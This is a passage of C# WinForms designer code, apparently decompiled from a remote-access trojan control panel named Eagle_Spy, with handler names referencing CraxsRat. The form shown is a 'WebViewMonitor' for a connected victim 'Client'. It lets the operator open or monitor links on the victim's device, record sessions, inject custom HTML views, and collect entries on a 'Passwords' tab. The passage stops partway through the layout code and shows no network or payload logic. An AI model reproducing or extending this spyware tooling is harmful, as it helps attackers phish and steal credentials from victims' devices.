using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.My.Resources;
using Eagle_Spy.sockets;
using DrakeUI.Framework;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class WebViewMonitor : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TargetLink")]
	private DrakeUITextBox _TargetLink;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("openbtn")]
	private DrakeUIButtonIcon _openbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("vsbar")]
	private DrakeUIScrollBar _vsbar;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("selecthtmlbtn")]
	private DrakeUIButtonIcon _selecthtmlbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BWloader")]
	private BackgroundWorker _BWloader;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("timeloader")]
	private Timer _timeloader;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("commndbtn")]
	private DrakeUIButtonIcon _commndbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("refbtn")]
	private DrakeUIButtonIcon _refbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("namescombo")]
	private DrakeUIComboBox _namescombo;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("cpybtn")]
	private DrakeUIButtonIcon _cpybtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("savbtn")]
	private DrakeUIButtonIcon _savbtn;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("clrbtn")]
	private DrakeUIButtonIcon _clrbtn;

	public Client Classclient;

	public string Title;

	public object firstclick;

	public Dictionary<string, string> MapData;

	private int y;

	internal DrakeUITextBox TargetLink
	;

	internal DrakeUIButtonIcon openbtn
	;

	[field: AccessedThroughProperty("DrakeUIComboBox1")]
	internal DrakeUIComboBox DrakeUIComboBox1
    ;

    [field: AccessedThroughProperty("Mytitle")]
	internal Label Mytitle
    ;

    [field: AccessedThroughProperty("statustext")]
	internal Label statustext
    ;

    [field: AccessedThroughProperty("Panel3")]
	internal Panel Panel3
    ;

	internal DrakeUIScrollBar vsbar
	;


	[field: AccessedThroughProperty("tabcontrols")]
	internal DrakeUITabControl tabcontrols
    ;

    [field: AccessedThroughProperty("TabPage1")]
	internal TabPage TabPage1
    ;

    [field: AccessedThroughProperty("TabPage2")]
	internal TabPage TabPage2
;

    [field: AccessedThroughProperty("resulttext")]
	internal Label resulttext
    ;

    [field: AccessedThroughProperty("Panel4")]
	internal Panel Panel4
    ;

    [field: AccessedThroughProperty("Label2")]
	internal Label Label2
;

	internal DrakeUIButtonIcon selecthtmlbtn
	;

	internal BackgroundWorker BWloader
	;

	internal Timer timeloader
	;

	[field: AccessedThroughProperty("Panel1")]
	internal Panel Panel1
	;

	[field: AccessedThroughProperty("Panel2")]
	internal Panel Panel2
    ;

    [field: AccessedThroughProperty("SaveCheck")]
	internal DrakeUICheckBox SaveCheck
    ;

    [field: AccessedThroughProperty("vewimage")]
	internal PictureBox vewimage
    ;

    [field: AccessedThroughProperty("Panel5")]
	internal Panel Panel5
   ;

    [field: AccessedThroughProperty("clinameinfo")]
	internal Label clinameinfo
    ;

    [field: AccessedThroughProperty("ClientPic")]
	internal PictureBox ClientPic
    ;

    [field: AccessedThroughProperty("Panel7")]
	internal Panel Panel7
    ;

    [field: AccessedThroughProperty("Panel6")]
	internal Panel Panel6
    ;
    [field: AccessedThroughProperty("TabPage3")]
	internal TabPage TabPage3
    ;

    [field: AccessedThroughProperty("linkspanel")]
	internal DrakeUITitlePanel linkspanel
    ;

    [field: AccessedThroughProperty("datapanel")]
	internal DrakeUITitlePanel datapanel
	

    ;

        [field: AccessedThroughProperty("Panel8")]
	internal Panel Panel8
    ;

    [field: AccessedThroughProperty("DrakeUIButtonIcon1")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon1
    ;

    [field: AccessedThroughProperty("DrakeUIButtonIcon2")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon2
    ;

    [field: AccessedThroughProperty("DrakeUITextBox1")]
	internal DrakeUITextBox DrakeUITextBox1
    ;

    [field: AccessedThroughProperty("Label1")]
	internal Label Label1
    ;
    [field: AccessedThroughProperty("DrakeUITextBox3")]
	internal DrakeUITextBox DrakeUITextBox3
    ;

    [field: AccessedThroughProperty("DrakeUITextBox2")]
	internal DrakeUITextBox DrakeUITextBox2
    ;

    [field: AccessedThroughProperty("DrakeUIButtonIcon4")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon4
    ;

    [field: AccessedThroughProperty("Actionslistcombo")]
	internal DrakeUIComboBox Actionslistcombo
    ;

    [field: AccessedThroughProperty("TargetsListcombo")]
	internal DrakeUIComboBox TargetsListcombo
;

    [field: AccessedThroughProperty("DrakeUIButtonIcon3")]
	internal DrakeUIButtonIcon DrakeUIButtonIcon3
    ;

	internal DrakeUIButtonIcon commndbtn
	;

	internal DrakeUIButtonIcon refbtn
	;

	[field: AccessedThroughProperty("datalogtext")]
	internal DrakeUIRichTextBox datalogtext
    ;

    [field: AccessedThroughProperty("linktext")]
	internal DrakeUITextBox linktext
    ;

    [field: AccessedThroughProperty("comandcombo")]
	internal DrakeUIComboBox comandcombo
    ;

	internal DrakeUIComboBox namescombo
;

	[field: AccessedThroughProperty("idtext")]
	internal DrakeUITextBox idtext
    ;

    [field: AccessedThroughProperty("nametext")]
	internal DrakeUITextBox nametext
        ;


    [field: AccessedThroughProperty("Panel9")]
	internal Panel Panel9
        ;


	internal DrakeUIButtonIcon cpybtn
	;

	internal DrakeUIButtonIcon savbtn
;
    private Sipaa.Framework.SPanel sPanel1;
    private Label label6;
    private DrakeUIAvatar drakeUIAvatar1;
    private Label label5;
    private Label label4;
    private Sipaa.Framework.SPanel sPanel3;
    private Sipaa.Framework.SPanel sPanel2;
    private DrakeUIAvatar drakeUIAvatar2;
    private Label label3;
    internal DrakeUIButtonIcon clrbtn
	;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.Panel1 = new System.Windows.Forms.Panel();
            this.Panel7 = new System.Windows.Forms.Panel();
            this.SaveCheck = new DrakeUI.Framework.DrakeUICheckBox();
            this.Panel6 = new System.Windows.Forms.Panel();
            this.TargetLink = new DrakeUI.Framework.DrakeUITextBox();
            this.Mytitle = new System.Windows.Forms.Label();
            this.DrakeUIComboBox1 = new DrakeUI.Framework.DrakeUIComboBox();
            this.openbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.Panel2 = new System.Windows.Forms.Panel();
            this.statustext = new System.Windows.Forms.Label();
            this.Panel3 = new System.Windows.Forms.Panel();
            this.tabcontrols = new DrakeUI.Framework.DrakeUITabControl();
            this.TabPage1 = new System.Windows.Forms.TabPage();
            this.vewimage = new System.Windows.Forms.PictureBox();
            this.vsbar = new DrakeUI.Framework.DrakeUIScrollBar();
            this.TabPage2 = new System.Windows.Forms.TabPage();
            this.resulttext = new System.Windows.Forms.Label();
            this.Panel4 = new System.Windows.Forms.Panel();
            this.Label2 = new System.Windows.Forms.Label();
            this.selecthtmlbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.datapanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.datalogtext = new DrakeUI.Framework.DrakeUIRichTextBox();
            this.linkspanel = new DrakeUI.Framework.DrakeUITitlePanel();
            this.Panel8 = new System.Windows.Forms.Panel();
            this.Panel9 = new System.Windows.Forms.Panel();
            this.comandcombo = new DrakeUI.Framework.DrakeUIComboBox();
            this.namescombo = new DrakeUI.Framework.DrakeUIComboBox();
            this.commndbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.idtext = new DrakeUI.Framework.DrakeUITextBox();
            this.nametext = new DrakeUI.Framework.DrakeUITextBox();
            this.linktext = new DrakeUI.Framework.DrakeUITextBox();
            this.refbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.savbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.clrbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.cpybtn = new DrakeUI.Framework.DrakeUIButtonIcon();
            this.BWloader = new System.ComponentModel.BackgroundWorker();
            this.timeloader = new System.Windows.Forms.Timer(this.components);
            this.Panel5 = new System.Windows.Forms.Panel();
            this.clinameinfo = new System.Windows.Forms.Label();
            this.ClientPic = new System.Windows.Forms.PictureBox();
            this.sPanel1 = new Sipaa.Framework.SPanel();
            this.label3 = new System.Windows.Forms.Label();
            this.label6 = new System.Windows.Forms.Label();
            this.drakeUIAvatar1 = new DrakeUI.Framework.DrakeUIAvatar();
            this.label5 = new System.Windows.Forms.Label();
            this.label4 = new System.Windows.Forms.Label();
            this.sPanel3 = new Sipaa.Framework.SPanel();
            this.sPanel2 = new Sipaa.Framework.SPanel();
            this.drakeUIAvatar2 = new DrakeUI.Framework.DrakeUIAvatar();
            this.Panel1.SuspendLayout();
            this.Panel7.SuspendLayout();
            this.Panel6.SuspendLayout();
            this.Panel2.SuspendLayout();
            this.Panel3.SuspendLayout();
            this.tabcontrols.SuspendLayout();
            this.TabPage1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.vewimage)).BeginInit();
            this.TabPage2.SuspendLayout();
            this.Panel4.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.datapanel.SuspendLayout();
            this.Panel5.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.ClientPic)).BeginInit();
            this.sPanel1.SuspendLayout();
            this.sPanel3.SuspendLayout();
            this.sPanel2.SuspendLayout();
            this.SuspendLayout();
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.Black;
            this.Panel1.Controls.Add(this.Panel7);
            this.Panel1.Controls.Add(this.Panel6);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel1.Location = new System.Drawing.Point(0, 0);
            this.Panel1.Margin = new System.Windows.Forms.Padding(4);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(1548, 69);
            this.Panel1.TabIndex = 1;
            // 
            // Panel7
            // 
            this.Panel7.Controls.Add(this.SaveCheck);
            this.Panel7.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel7.Location = new System.Drawing.Point(0, 0);
            this.Panel7.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel7.Name = "Panel7";
            this.Panel7.Size = new System.Drawing.Size(1548, 32);
            this.Panel7.TabIndex = 24;
            // 
            // SaveCheck
            // 
            this.SaveCheck.CheckBoxColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.SaveCheck.Cursor = System.Windows.Forms.Cursors.Hand;
            this.SaveCheck.Dock = System.Windows.Forms.DockStyle.Right;
            this.SaveCheck.Font = new System.Drawing.Font("Calibri", 9F);
            this.SaveCheck.ForeColor = System.Drawing.Color.White;
            this.SaveCheck.Location = new System.Drawing.Point(1451, 0);
            this.SaveCheck.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.SaveCheck.Name = "SaveCheck";
            this.SaveCheck.Padding = new System.Windows.Forms.Padding(22, 0, 0, 0);
            this.SaveCheck.RightToLeft = System.Windows.Forms.RightToLeft.Yes;
            this.SaveCheck.Size = new System.Drawing.Size(97, 32);
            this.SaveCheck.Style = DrakeUI.Framework.UIStyle.Custom;
            this.SaveCheck.StyleCustomMode = true;
            this.SaveCheck.TabIndex = 22;
            this.SaveCheck.Text = "Record";
            this.SaveCheck.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // Panel6
            // 
            this.Panel6.Controls.Add(this.TargetLink);
            this.Panel6.Controls.Add(this.Mytitle);
            this.Panel6.Controls.Add(this.DrakeUIComboBox1);
            this.Panel6.Controls.Add(this.openbtn);
            this.Panel6.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel6.Location = new System.Drawing.Point(0, 32);
            this.Panel6.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.Panel6.Name = "Panel6";
            this.Panel6.Size = new System.Drawing.Size(1548, 37);
            this.Panel6.TabIndex = 23;
            // 
            // TargetLink
            // 
            this.TargetLink.Cursor = System.Windows.Forms.Cursors.IBeam;
            this.TargetLink.Dock = System.Windows.Forms.DockStyle.Fill;
            this.TargetLink.FillColor = System.Drawing.Color.Black;
            this.TargetLink.Font = new System.Drawing.Font("Calibri", 12F);
            this.TargetLink.ForeColor = System.Drawing.Color.White;
            this.TargetLink.Location = new System.Drawing.Point(168, 0);
            this.TargetLink.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.TargetLink.Maximum = 2147483647D;
            this.TargetLink.Minimum = -2147483648D;
            this.TargetLink.Name = "TargetLink";
            this.TargetLink.Padding = new System.Windows.Forms.Padding(7, 6, 7, 6);
            this.TargetLink.Radius = 15;
            this.TargetLink.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.TargetLink.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.TargetLink.Size = new System.Drawing.Size(1095, 32);
            this.TargetLink.Style = DrakeUI.Framework.UIStyle.Custom;
            this.TargetLink.TabIndex = 19;
            this.TargetLink.Watermark = "Enter Link";
            this.TargetLink.WordWarp = false;
            this.TargetLink.MouseDown += new System.Windows.Forms.MouseEventHandler(this.DrakeUITextBox1_MouseDown);
            // 
            // Mytitle
            // 
            this.Mytitle.Dock = System.Windows.Forms.DockStyle.Left;
            this.Mytitle.Font = new System.Drawing.Font("Calibri", 14F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Mytitle.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Mytitle.Location = new System.Drawing.Point(0, 0);
            this.Mytitle.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Mytitle.Name = "Mytitle";
            this.Mytitle.Size = new System.Drawing.Size(168, 37);
            this.Mytitle.TabIndex = 20;
            this.Mytitle.Text = "Website Link";
            // 
            // DrakeUIComboBox1
            // 
            this.DrakeUIComboBox1.Dock = System.Windows.Forms.DockStyle.Right;
            this.DrakeUIComboBox1.DropDownStyle = DrakeUI.Framework.UIDropDownStyle.DropDownList;
            this.DrakeUIComboBox1.FillColor = System.Drawing.Color.Black;
            this.DrakeUIComboBox1.Font = new System.Drawing.Font("Calibri", 12F);
            this.DrakeUIComboBox1.ForeColor = System.Drawing.Color.White;
            this.DrakeUIComboBox1.Items.AddRange(new object[] {
            "Just Open",
            "Open + Monitor"});
            this.DrakeUIComboBox1.Location = new System.Drawing.Point(1263, 0);
            this.DrakeUIComboBox1.Margin = new System.Windows.Forms.Padding(5, 6, 5, 6);
            this.DrakeUIComboBox1.MinimumSize = new System.Drawing.Size(84, 0);
            this.DrakeUIComboBox1.Name = "DrakeUIComboBox1";
            this.DrakeUIComboBox1.Padding = new System.Windows.Forms.Padding(0, 0, 30, 0);
            this.DrakeUIComboBox1.Radius = 15;
            this.DrakeUIComboBox1.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.DrakeUIComboBox1.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.DrakeUIComboBox1.Size = new System.Drawing.Size(153, 32);
            this.DrakeUIComboBox1.Style = DrakeUI.Framework.UIStyle.Custom;
            this.DrakeUIComboBox1.TabIndex = 21;
            this.DrakeUIComboBox1.Text = "Just Open";
            this.DrakeUIComboBox1.TextAlignment = System.Drawing.ContentAlignment.MiddleLeft;
            // 
            // openbtn
            // 
            this.openbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.openbtn.Dock = System.Windows.Forms.DockStyle.Right;
            this.openbtn.FillColor = System.Drawing.Color.Black;
            this.openbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.openbtn.FillPressColor = System.Drawing.Color.Black;
            this.openbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.openbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.openbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.openbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.openbtn.Location = new System.Drawing.Point(1416, 0);
            this.openbtn.Margin = new System.Windows.Forms.Padding(4);
            this.openbtn.Name = "openbtn";
            this.openbtn.Radius = 25;
            this.openbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.openbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.openbtn.RectHoverColor = System.Drawing.Color.White;
            this.openbtn.RectPressColor = System.Drawing.Color.White;
            this.openbtn.RectSelectedColor = System.Drawing.Color.White;
            this.openbtn.Size = new System.Drawing.Size(132, 37);
            this.openbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.openbtn.Symbol = 57571;
            this.openbtn.TabIndex = 18;
            this.openbtn.Text = "Open";
            this.openbtn.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsnhsdzx);
            // 
            // Panel2
            // 
            this.Panel2.BackColor = System.Drawing.Color.Black;
            this.Panel2.Controls.Add(this.statustext);
            this.Panel2.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.Panel2.Location = new System.Drawing.Point(0, 603);
            this.Panel2.Margin = new System.Windows.Forms.Padding(4);
            this.Panel2.Name = "Panel2";
            this.Panel2.Size = new System.Drawing.Size(1548, 22);
            this.Panel2.TabIndex = 2;
            // 
            // statustext
            // 
            this.statustext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.statustext.Font = new System.Drawing.Font("Calibri", 9F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.statustext.ForeColor = System.Drawing.Color.Lime;
            this.statustext.Location = new System.Drawing.Point(0, 0);
            this.statustext.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.statustext.Name = "statustext";
            this.statustext.Size = new System.Drawing.Size(1548, 22);
            this.statustext.TabIndex = 21;
            this.statustext.Text = "...";
            // 
            // Panel3
            // 
            this.Panel3.Controls.Add(this.tabcontrols);
            this.Panel3.Controls.Add(this.Panel2);
            this.Panel3.Location = new System.Drawing.Point(-11, 0);
            this.Panel3.Margin = new System.Windows.Forms.Padding(4);
            this.Panel3.Name = "Panel3";
            this.Panel3.Size = new System.Drawing.Size(1548, 625);
            this.Panel3.TabIndex = 3;
            this.Panel3.Visible = false;
            // 
            // tabcontrols
            // 
            this.tabcontrols.Controls.Add(this.TabPage1);
            this.tabcontrols.Controls.Add(this.TabPage2);
            this.tabcontrols.Controls.Add(this.TabPage3);
            this.tabcontrols.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabcontrols.DrawMode = System.Windows.Forms.TabDrawMode.OwnerDrawFixed;
            this.tabcontrols.FillColor = System.Drawing.Color.Black;
            this.tabcontrols.Font = new System.Drawing.Font("Calibri", 12F);
            this.tabcontrols.ItemSize = new System.Drawing.Size(380, 40);
            this.tabcontrols.Location = new System.Drawing.Point(0, 0);
            this.tabcontrols.Margin = new System.Windows.Forms.Padding(4);
            this.tabcontrols.MenuStyle = DrakeUI.Framework.UIMenuStyle.Custom;
            this.tabcontrols.Multiline = true;
            this.tabcontrols.Name = "tabcontrols";
            this.tabcontrols.SelectedIndex = 0;
            this.tabcontrols.Size = new System.Drawing.Size(1548, 603);
            this.tabcontrols.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabcontrols.Style = DrakeUI.Framework.UIStyle.Custom;
            this.tabcontrols.TabBackColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.tabcontrols.TabIndex = 2;
            this.tabcontrols.TabSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.tabcontrols.TabSelectedForeColor = System.Drawing.Color.Black;
            this.tabcontrols.TabSelectedHighColor = System.Drawing.Color.Black;
            this.tabcontrols.TabUnSelectedForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(240)))), ((int)(((byte)(240)))), ((int)(((byte)(240)))));
            // 
            // TabPage1
            // 
            this.TabPage1.BackColor = System.Drawing.Color.Black;
            this.TabPage1.Controls.Add(this.vewimage);
            this.TabPage1.Controls.Add(this.vsbar);
            this.TabPage1.Controls.Add(this.Panel1);
            this.TabPage1.Location = new System.Drawing.Point(0, 40);
            this.TabPage1.Margin = new System.Windows.Forms.Padding(4);
            this.TabPage1.Name = "TabPage1";
            this.TabPage1.Size = new System.Drawing.Size(1548, 563);
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "General";
            // 
            // vewimage
            // 
            this.vewimage.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(10)))), ((int)(((byte)(10)))));
            this.vewimage.Dock = System.Windows.Forms.DockStyle.Fill;
            this.vewimage.Location = new System.Drawing.Point(0, 69);
            this.vewimage.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.vewimage.Name = "vewimage";
            this.vewimage.Size = new System.Drawing.Size(1523, 494);
            this.vewimage.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.vewimage.TabIndex = 3;
            this.vewimage.TabStop = false;
            // 
            // vsbar
            // 
            this.vsbar.Dock = System.Windows.Forms.DockStyle.Right;
            this.vsbar.FillColor = System.Drawing.Color.Black;
            this.vsbar.Font = new System.Drawing.Font("Calibri", 12F);
            this.vsbar.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.vsbar.Location = new System.Drawing.Point(1523, 69);
            this.vsbar.Margin = new System.Windows.Forms.Padding(4);
            this.vsbar.Name = "vsbar";
            this.vsbar.PressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.vsbar.Size = new System.Drawing.Size(25, 494);
            this.vsbar.Style = DrakeUI.Framework.UIStyle.Custom;
            this.vsbar.TabIndex = 1;
            this.vsbar.Text = "DrakeUIScrollBar1";
            this.vsbar.ValueChanged += new System.EventHandler(this.Vsbar_ValueChanged);
            // 
            // TabPage2
            // 
            this.TabPage2.BackColor = System.Drawing.Color.Black;
            this.TabPage2.Controls.Add(this.resulttext);
            this.TabPage2.Controls.Add(this.Panel4);
            this.TabPage2.Location = new System.Drawing.Point(0, 40);
            this.TabPage2.Margin = new System.Windows.Forms.Padding(4);
            this.TabPage2.Name = "TabPage2";
            this.TabPage2.Size = new System.Drawing.Size(1548, 563);
            this.TabPage2.TabIndex = 1;
            this.TabPage2.Text = "Custome";
            // 
            // resulttext
            // 
            this.resulttext.BackColor = System.Drawing.Color.Black;
            this.resulttext.Dock = System.Windows.Forms.DockStyle.Fill;
            this.resulttext.ForeColor = System.Drawing.Color.White;
            this.resulttext.Location = new System.Drawing.Point(0, 73);
            this.resulttext.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.resulttext.Name = "resulttext";
            this.resulttext.Size = new System.Drawing.Size(1548, 490);
            this.resulttext.TabIndex = 1;
            this.resulttext.Text = "Client Result";
            this.resulttext.TextAlign = System.Drawing.ContentAlignment.TopCenter;
            // 
            // Panel4
            // 
            this.Panel4.BackColor = System.Drawing.Color.Black;
            this.Panel4.Controls.Add(this.Label2);
            this.Panel4.Controls.Add(this.selecthtmlbtn);
            this.Panel4.Dock = System.Windows.Forms.DockStyle.Top;
            this.Panel4.Location = new System.Drawing.Point(0, 0);
            this.Panel4.Margin = new System.Windows.Forms.Padding(4);
            this.Panel4.Name = "Panel4";
            this.Panel4.Size = new System.Drawing.Size(1548, 73);
            this.Panel4.TabIndex = 2;
            // 
            // Label2
            // 
            this.Label2.AutoSize = true;
            this.Label2.Font = new System.Drawing.Font("Calibri", 20F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Label2.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.Label2.Location = new System.Drawing.Point(16, 11);
            this.Label2.Margin = new System.Windows.Forms.Padding(4, 0, 4, 0);
            this.Label2.Name = "Label2";
            this.Label2.Size = new System.Drawing.Size(230, 41);
            this.Label2.TabIndex = 20;
            this.Label2.Text = "Add Html View";
            // 
            // selecthtmlbtn
            // 
            this.selecthtmlbtn.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.selecthtmlbtn.Cursor = System.Windows.Forms.Cursors.Hand;
            this.selecthtmlbtn.FillColor = System.Drawing.Color.Black;
            this.selecthtmlbtn.FillHoverColor = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(20)))), ((int)(((byte)(20)))));
            this.selecthtmlbtn.FillPressColor = System.Drawing.Color.Black;
            this.selecthtmlbtn.FillSelectedColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.selecthtmlbtn.Font = new System.Drawing.Font("Calibri", 12F);
            this.selecthtmlbtn.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.selecthtmlbtn.ForePressColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.selecthtmlbtn.Location = new System.Drawing.Point(1308, 25);
            this.selecthtmlbtn.Margin = new System.Windows.Forms.Padding(4);
            this.selecthtmlbtn.Name = "selecthtmlbtn";
            this.selecthtmlbtn.Radius = 25;
            this.selecthtmlbtn.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
            this.selecthtmlbtn.RectDisableColor = System.Drawing.Color.FromArgb(((int)(((byte)(227)))), ((int)(((byte)(242)))), ((int)(((byte)(253)))));
            this.selecthtmlbtn.RectHoverColor = System.Drawing.Color.White;
            this.selecthtmlbtn.RectPressColor = System.Drawing.Color.White;
            this.selecthtmlbtn.RectSelectedColor = System.Drawing.Color.White;
            this.selecthtmlbtn.Size = new System.Drawing.Size(227, 32);
            this.selecthtmlbtn.Style = DrakeUI.Framework.UIStyle.Custom;
            this.selecthtmlbtn.Symbol = 61543;
            this.selecthtmlbtn.TabIndex = 18;
            this.selecthtmlbtn.Text = "Select Html File";
            this.selecthtmlbtn.Click += new System.EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwashgys);
            // 
            // TabPage3
            // 
            this.TabPage3.BackColor = System.Drawing.Color.Black;
            this.TabPage3.Controls.Add(this.datapanel);
            this.TabPage3.Controls.Add(this.linkspanel);
            this.TabPage3.Controls.Add(this.Panel8);
            this.TabPage3.Controls.Add(this.Panel9);
            this.TabPage3.Location = new System.Drawing.Point(0, 40);
            this.TabPage3.Margin = new System.Windows.Forms.Padding(3, 2, 3, 2);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(1548, 563);
            this.TabPage3.TabIndex = 0;
            this.TabPage3.Text = "Passwords";
            // 
            // datapanel
            // 
            this.datapanel.Controls.Add(this.datalogtext);
            this.datapanel.Dock = System.Windows.Forms.DockStyle.Fill;
            this.datapanel.FillColor = System.Drawing.Color.Black;
            this.datapanel.Font = new System.Drawing.Font("Calibri", 12F);
            this.datapanel.ForeColor = System.Drawing.Color.White;
            this.datapanel.Location = new System.Drawing.Point(379, 50);
            this.datapanel.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
            this.datapanel.Name = "datapanel";
            this.datapanel.Padding = new System.Windows.Forms.Padding(0, 34, 0, 0);
            this.datapanel.RectColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(5)))), ((int)(((byte)(17)))));
